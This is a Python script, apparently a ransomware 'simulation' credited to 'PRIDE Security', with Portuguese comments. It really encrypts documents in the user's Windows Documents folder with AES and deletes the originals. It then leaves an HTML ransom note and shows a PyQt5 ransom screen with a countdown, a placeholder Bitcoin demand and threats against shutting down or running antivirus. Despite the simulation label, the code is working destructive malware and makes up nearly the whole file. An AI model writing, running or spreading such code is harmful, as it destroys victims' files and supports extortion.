# ransomware.py
import os
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import sys
from PyQt5.QtWidgets import QApplication, QWidget, QLabel, QVBoxLayout, QHBoxLayout
from PyQt5.QtGui import QFont, QColor, QPalette
from PyQt5.QtCore import Qt, QTimer

# Chave criptografada fictícia
ENCRYPTED_KEY = base64.b64encode(b"SuperSecureKey123456789012345678").decode()

class RansomwareGUI(QWidget):
    def __init__(self, encoded_key):  # <- adicione esse parâmetro
        super().__init__()
        self.encoded_key = encoded_key  # salva para usar na GUI
        self.setWindowTitle("PRIDE Security – Simulação de Ransomware")
        self.setGeometry(100, 100, 600, 400)
        self.setup_ui()

    def setup_ui(self):
        # Layouts principais
        main_layout = QVBoxLayout()
        main_layout.setSpacing(20)

        # Título
        title = QLabel("⚠️  SEUS ARQUIVOS FORAM CRIPTOGRAFADOS  ⚠️")
        title.setFont(QFont("Arial", 18, QFont.Bold))
        title.setStyleSheet("color: red;")
        title.setAlignment(Qt.AlignCenter)

        subtitle = QLabel("Esta é uma simulação feita pela PRIDE Security.")
        subtitle.setFont(QFont("Arial", 11))
        subtitle.setStyleSheet("color: white;")
        subtitle.setAlignment(Qt.AlignCenter)

        # Mensagem de ameaça
        instructions = QLabel(
            "NÃO RENOMEIE NEM MOVA OS ARQUIVOS!\n"
            "NÃO TENTE DESLIGAR A MÁQUINA OU RODAR ANTIVÍRUS!\n"
            "PARA RECUPERAR SEUS DADOS:\n\n"
            "Envie 100 BTC para a carteira: 1PRIDEbtcFakeADDR1234567890\n"
            "Contato: security@pride-sec.test"
        )
        instructions.setFont(QFont("Courier", 10))
        instructions.setStyleSheet("color: white;")
        instructions.setAlignment(Qt.AlignCenter)

        # Chave criptografada exibida
        key_label = QLabel(f"Encrypted Key:\n{ENCRYPTED_KEY}")
        key_label.setFont(QFont("Courier", 10))
        key_label.setStyleSheet("color: white;")
        key_label.setAlignment(Qt.AlignCenter)

        # Contador de tempo regressivo
        self.timer_label = QLabel("TEMPO RESTANTE: 09:59:59")
        self.timer_label.setFont(QFont("Arial", 14, QFont.Bold))
        self.timer_label.setStyleSheet("color: red;")
        self.timer_label.setAlignment(Qt.AlignCenter)

        self.hours = 9
        self.minutes = 59
        self.seconds = 59
        self.timer = QTimer()
        self.timer.timeout.connect(self.update_timer)
        self.timer.start(1000)

        # Adiciona tudo ao layout
        main_layout.addWidget(title)
        main_layout.addWidget(subtitle)
        main_layout.addWidget(instructions)
        main_layout.addWidget(key_label)
        main_layout.addWidget(self.timer_label)

        # Plano de fundo preto
        palette = self.palette()
        palette.setColor(QPalette.Window, QColor(0, 0, 0))
        self.setPalette(palette)
        self.setAutoFillBackground(True)

        self.setLayout(main_layout)

    def update_timer(self):
        self.seconds -= 1
        if self.seconds < 0:
            self.seconds = 59
            self.minutes -= 1
            if self.minutes < 0:
                self.minutes = 59
                self.hours -= 1
                if self.hours < 0:
                    self.timer.stop()
                    self.timer_label.setText("TEMPO ESGOTADO!")
                    return

        self.timer_label.setText(
            f"TEMPO RESTANTE: {self.hours:02d}:{self.minutes:02d}:{self.seconds:02d}"
        )

def run_gui():
    app = QApplication(sys.argv)
    window = RansomwareGUI()
    window.show()
    sys.exit(app.exec_())

# Caminho da pasta alvo no Windows (ex: Documentos)
TARGET_DIR = os.path.join(os.environ["USERPROFILE"], "Documents")

# Chave AES-256
KEY = b"SuperSecureKey123456789012345678"

# Extensões de arquivos a criptografar
EXTENSIONS = [".txt", ".docx", ".xlsx", ".csv", ".pdf"]

# Extensão usada nos arquivos criptografados
ENCRYPTED_EXTENSION = ".quodlocked"

def print_banner():
    print("=== Simulação de Ransomware por PRIDE Security ===\n")

def encrypt_file(filepath):
    with open(filepath, 'rb') as f:
        data = f.read()

    iv = os.urandom(16)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    encrypted_data = iv + cipher.encrypt(pad(data, AES.block_size))

    with open(filepath + ENCRYPTED_EXTENSION, 'wb') as f:
        f.write(encrypted_data)

    os.remove(filepath)

def find_and_encrypt_files():
    total = 0
    for root, _, files in os.walk(TARGET_DIR):
        for file in files:
            if any(file.endswith(ext) for ext in EXTENSIONS):
                full_path = os.path.join(root, file)
                encrypt_file(full_path)
                print(f"[+] Arquivo criptografado: {full_path}")
                total += 1
    return total

def drop_ransom_note():
    note = (
        "<html><body><h1 style='color:red;'>SEUS ARQUIVOS FORAM CRIPTOGRAFADOS</h1>"
        "<p>Esta é uma simulação feita pela PRIDE Security.</p>"
        "<p>Para recuperar seus dados, envie 100 Bitcoins para: 1HUMORn0FakeBTCAddr1234567</p>"
        "<p>Entre em contato: devolver@ransom.test</p>"
        "</body></html>"
    )
    note_path = os.path.join(TARGET_DIR, "README_RECOVER.html")
    with open(note_path, "w") as f:
        f.write(note)
    print(f"\n[!] Nota de resgate criada: {note_path}")

if __name__ == "__main__":
    print_banner()
    print("[*] Iniciando simulação de ransomware...\n")
    total = find_and_encrypt_files()
    drop_ransom_note()
    print(f"\n[✓] Total de arquivos criptografados: {total}")
    print("[✓] Fim da simulação.\n")

    # Mostra GUI com a chave (aqui usamos a chave AES codificada como simulação)
    encoded_key = base64.b64encode(KEY).decode()
    app = QApplication(sys.argv)
    window = RansomwareGUI(encoded_key)
    window.show()
    sys.exit(app.exec_())
# Execução do ransomware (criptografia, etc...)

# Mostra GUI ao final

    
